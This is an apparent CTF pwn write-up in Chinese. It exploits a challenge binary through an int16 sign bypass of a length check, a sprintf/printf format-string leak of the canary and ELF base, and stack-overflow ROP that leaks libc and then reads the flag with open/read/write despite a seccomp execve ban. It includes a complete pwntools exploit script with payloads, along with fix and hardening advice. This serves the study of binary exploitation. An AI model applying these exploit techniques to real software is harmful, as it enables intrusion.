---
id: ctf-pwn-int16-length-sign-bypass-sprintf-format-canary-orw
title: int16 长度检查符号绕过 + sprintf 格式化字符串泄 canary + 栈溢出 ORW（seccomp 禁 execve）
type: scenario
domain: ctf
path: ctf/pwn
technique: int16-signedness-length-bypass-sprintf-format-canary-orw
tags:
- ctf
- pwn
- integer-overflow
- signedness
- format-string
- canary
- stack-overflow
- seccomp
- orw
- rop
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:17+08:00'
  notes: '已对照原文核对：unsigned __int16 + (v1&0x8000)/取负/仍为 0x8000、(int16)v1>2 绕过、read 0x8000 溢出、sprintf(tmp,''NOTE: %s'',buf)+printf(tmp)、%7$p/%9$p 泄 ELF/canary、Exnote 0x200 栈溢出、seccomp 仅禁 execve、open/read/write ORW，与原文一致。已修正 PoC 路径前缀为 12 字节（aa/flag+3 NUL+2 a）以对齐 buf[12]。未验证点：未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。'
url: /docs/ctf/pwn/ctf-pwn-int16-length-sign-bypass-sprintf-format-canary-orw/
draft: false
kb_aliases:
- Exnote
- 0x8000 负数长度
- int16 溢出绕过长度限制
- sprintf 格式化字符串
- seccomp orw
- open read write 读 flag
---

## 一句话结论

`log_note` 用 `unsigned __int16` 接收长度并做 `(v1 & 0x8000)` / `(__int16)v1 > 2` 检查：输入 `0x8000` 被解释为 -32768，取负后仍回到 `0x8000`，从而绕过“长度必须 ≤2”的限制，`read(0, buf, 0x8000)` 向 `buf[12]` 造成大溢出；写入的内容又被 `sprintf(tmp, "NOTE: %s", buf)` 拼接并由 `show_note` 以 `printf(tmp)` 输出，可用 `%7$p/%9$p` 泄露代码基址与 canary；随后在 `Exnote` 的 `read(0, buf, 0x200)` 栈溢出构造 ROP，在 seccomp 禁止 `execve` 时用 `open/read/write` 读取 flag。

## 原理

- **符号/截断绕过**：`scanf("%hd%*c", &v1)` 把 `0x8000`（32768）读入 16 位有符号变量，结果为 -32768。`(v1 & 0x8000) != 0` 为真，执行 `v1 = -v1`：`-(-32768)` 在 int 中是 32768，赋回 `unsigned __int16` 仍是 `0x8000`，符号位没有消失。紧接着 `(__int16)v1 > 2` 仍把 `0x8000` 解释为 -32768，条件为假，长度限制被绕过；`read(0, buf, v1)` 把 `v1` 转成 `size_t`，得到 32768，向 12 字节缓冲区读入最多 32KB。
- **格式化字符串**：`sprintf(tmp, "NOTE: %s", buf)` 将用户可控的 note 复制进 `tmp`，`show_note` 执行 `printf(tmp)`——`tmp` 内容被当作格式串。输入 `%7$p%9$p` 可让 `printf` 读取第 7、9 个参数槽，分别泄露 ELF 代码地址与 canary（槽位按题目栈布局调整）。
- **第二次栈溢出**：`Exnote` 中 `char buf[40]; read(0, buf, 0x200);`，到 canary 的偏移为 0x28；用第一次泄露的 canary 回填即可溢出返回地址。
- **seccomp 约束**：`seccomp-tools dump` 显示过滤器只允许 `ARCH_X86_64` 且对 `execve` 返回 `KILL`，其余 syscall 允许；因此不能用 `system("/bin/sh")`，要构造 `open("flag",0)` → `read(fd,buf,n)` → `write(1,buf,n)` 的 ORW ROP。
- **二次回到 log_note**：第一次 ROP 用 `puts@plt(puts@got)` 泄露 libc 后返回到 `log_note`，再次利用 0x8000 溢出写 ORW 链；路径字符串（如 `aa/flag\0`）可放在栈上并以其地址作为 `open` 参数。

## 触发条件

- 程序用 16 位有符号/无符号类型接收长度，只做符号位或“大于阈值”检查，未与缓冲区实际大小比较。
- 输入值能触发取负后仍为负数/大正数（如 `0x8000`），且 `read`/`memcpy` 的长度参数被转换为 `size_t`。
- 用户输入被 `sprintf`/`snprintf` 拼接到缓冲区后又被当作格式串传给 `printf`（或存在其它格式串泄露点）。
- 同一程序另有栈溢出函数，且 Canary 可先泄露。
- 目标启用 seccomp 禁止 `execve`，但允许 `open/read/write`；已知 libc 版本与 gadget 偏移。

## 利用步骤

1. 逆向 `log_note`：确认 `v1` 的类型、`scanf("%hd")`、`(v1 & 0x8000)` 与 `(__int16)v1 > 2` 两处检查，以及 `read(0, buf, v1)` 的缓冲区大小。
2. 输入长度 `0x8000`（32768），note 填 `%7$p%9$p`；程序 `sprintf` 后调用 show，解析输出中的两个 `0x...`：第一个减去已知偏移得到 ELF 基址，第二个为 canary（槽位不对时扫描 `%1$p`–`%30$p`）。
3. 计算 `pop rdi; ret`、`puts@plt`、`puts@got` 与返回 `log_note` 的地址；在 `Exnote` 发送 `b"a"*0x28 + p64(canary)*2 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(log_note)`，泄露 libc。
4. 解析 `puts` 实际地址得 `libc_base`；准备 `open/read/write`、`pop rdi/rsi/rdx` gadget 与栈上 `"aa/flag\x00"` 字符串地址。
5. 再次进入 `log_note`，长度仍发 `0x8000`；note 构造 ORW 链：`open(path,0)` → `read(3, buf, 0x30)` → `write(1, buf, 0x30)`，并回填 canary。
6. 触发 `Exnote` 返回执行 ROP，输出 flag。

## PoC

```python
from pwn import *
context(arch='amd64', log_level='debug')
p = process('./exnoted')
elf = ELF('./exnoted')
libc = ELF('./libc.so.6')

def add(content):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Input note length:", b"32768")  # 0x8000 -> int16 -32768 -> 0x8000
    p.sendafter(b"Input your note:", content)

def show():
    p.sendlineafter(b">", b"2")

add(b"%7$p%9$p")
show()
p.recvuntil(b"0x")
elf_base = int(p.recv(12), 16) - 0x1601
p.recvuntil(b"0x")
canary = int(p.recv(16), 16)

def exnote(content):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"This is Exnote:", content)

pop_rdi = elf_base + 0x132a
exnote(b"a"*0x28 + p64(canary)*2 + p64(pop_rdi) +
       p64(elf.got["puts"] + elf_base) + p64(elf.plt["puts"] + elf_base) +
       p64(elf_base + 0x1333))          # 返回 log_note
puts = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts - libc.sym["puts"]

rsi = libc_base + next(libc.search(asm("pop rsi\nret")))
rdx = libc_base + next(libc.search(asm("pop rdx\npop r12\nret")))
open_, read_, write_ = (libc_base + libc.sym[x] for x in ("open", "read", "write"))
path = elf_base + 0x4068                    # 栈上/数据区可写字符串地址，按题目调整

p.sendlineafter(b"Input note length:", b"32768")
payload  = b"aa/flag\x00\x00\x00" + b"a"*2
payload += p64(canary)*2
payload += p64(pop_rdi) + p64(path) + p64(rsi) + p64(0) + p64(open_)
payload += p64(pop_rdi) + p64(3) + p64(rsi) + p64(path) + p64(rdx) + p64(0x30)*2 + p64(read_)
payload += p64(pop_rdi) + p64(1) + p64(rsi) + p64(path) + p64(rdx) + p64(0x30)*2 + p64(write_)
p.sendafter(b"Input your note:", payload)
p.interactive()
```

## 变体与关联

- 变体：长度检查可能是 `int`/`size_t` 截断、`abs(INT_MIN)` 溢出、`uint8/uint16` 回绕；本质都是“检查值与实际使用值不一致”。
- 变体：无格式化字符串时，可用 `write(1, buf, n)` 或未初始化栈数据泄露 canary/libc；无 `open` 时可用 `openat`、`sendfile` 或 `execveat` 绕过 seccomp。
- 关联：[[ctf-pwn-byte-offset-check-int-heap-overflow-stdin-fsop]]（整型检查绕过导致堆溢出）、[[ctf-pwn-vm-operand-stack-index-unbounded-push-canary-leak-orw-rop]]（canary 泄露 + seccomp ORW）、[[binary-pwn-stack-fake-rbp-check-seccomp-orw]]（seccomp ORW 的另一条链）。
- 边界：`read` 长度若被 `min(len, sizeof(buf))` 限制则溢出不成立；seccomp 若还限制 `open/read/write`，需要换 `sendfile`/`openat`/`mmap` 等允许的 syscall；libc gadget 偏移依赖题目版本。

## 检测与防御

- 检测（CTF）：长度输入后出现“负数已反转/长度受限”提示但实际 `read` 长度仍很大；`sprintf` 后的缓冲区被直接 `printf`；`seccomp-tools dump` 显示仅禁 `execve`。
- 修复：长度用 `size_t` 接收并与 `sizeof(buf)` 比较；`scanf` 后检查范围与返回值；用户输入用 `printf("%s", tmp)` 输出；`read` 长度固定为缓冲区大小。
- 加固：开启 Canary/PIE/NX/Full RELRO；seccomp 默认拒绝并只放行必要 syscall；对整数边界做单元测试。
